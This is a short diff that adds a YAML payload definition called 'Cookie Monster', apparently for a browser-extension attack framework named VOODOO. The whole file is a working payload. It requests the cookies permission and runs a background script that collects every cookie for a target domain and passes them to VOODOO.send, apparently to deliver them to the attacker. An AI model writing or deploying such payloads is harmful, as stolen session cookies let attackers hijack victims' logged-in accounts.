@@ -1,0 +1,15 @@
+info:
+  name: Cookie Monster
+  description: Extract the cookies of a given domain
+  params:
+    - domain
+
+format: payload
+
+permissions:
+  - cookies
+
+scripts:
+  - content: |
+      chrome.cookies.getAll({domain: "%{domain}" }, VOODOO.send);
+    background: true
